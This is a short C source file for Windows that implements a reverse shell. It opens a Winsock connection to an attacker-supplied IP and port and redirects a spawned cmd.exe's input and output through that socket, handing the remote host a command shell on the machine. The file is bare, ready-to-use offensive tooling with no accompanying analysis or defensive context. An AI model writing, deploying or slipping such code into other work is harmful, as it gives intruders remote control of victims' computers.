#include <process.h>
#include <WinSock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <io.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib") 

# define IP_PROTOCOL 0
# define USAGE "Usage: ./reverse_shell [IP] [PORT]"


/**
 * Print a message and quit with exit code 1
 * */
void exit_with_error(char* message) {
	printf("%s\n", message);
	exit(1);
}

/**
 * Connects to remote server and returns
 * the connection socket descriptor
 * */
int connect_to_server(char* server_ip, int server_port) {
	int conn_handle = WSASocket(AF_INET, SOCK_STREAM, IP_PROTOCOL, NULL, (unsigned int)NULL, (unsigned int)NULL);
	
	if (conn_handle == -1) 
	{
		exit_with_error("Error in creating the connection socket");
	}
	
	struct sockaddr_in server_addr;
	
	//unsigned char ip_addr[INET_ADDRSTRLEN];
	IN_ADDR ip_addr;
	inet_pton(AF_INET, server_ip, &ip_addr);

	server_addr.sin_addr = ip_addr;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_family = AF_INET;

	if (WSAConnect(conn_handle, (const struct sockaddr*) &server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL) == -1) 
	{
		exit_with_error("Error while trying to connect to server");
	}
	
	return conn_handle;
}

int close_connection(int conn_handle) {
	printf("%s", "Closing connection\n");
	_close(conn_handle);
	return WSACleanup();
}

int exec_comm_handler(int sck) {
	// CreateProcess necessary info
	STARTUPINFO startup_info = { 0 };
	PROCESS_INFORMATION process_info;
	startup_info.cb = sizeof(startup_info);
	startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	startup_info.hStdInput = startup_info.hStdError = startup_info.hStdOutput = (HANDLE)sck;
	
	TCHAR cmd[] = L"cmd.exe";
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);

	WaitForSingleObject(process_info.hProcess, INFINITE);

	CloseHandle(process_info.hProcess);
	CloseHandle(process_info.hThread);
}

void initialize_winsock() {
	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) == -1) 
	{
		exit_with_error("Error initializing the winsock library");
	}
}

int main(int argc, char** argv) {
	if (argc != 3) {
		exit_with_error(USAGE);
	}

	initialize_winsock();

	char* ip = argv[1];
	int port = atoi(argv[2]);
	int conn_handle = connect_to_server(ip, port);
	
	exec_comm_handler(conn_handle);

	close_connection(conn_handle);
	return 0;

	exit(0);
}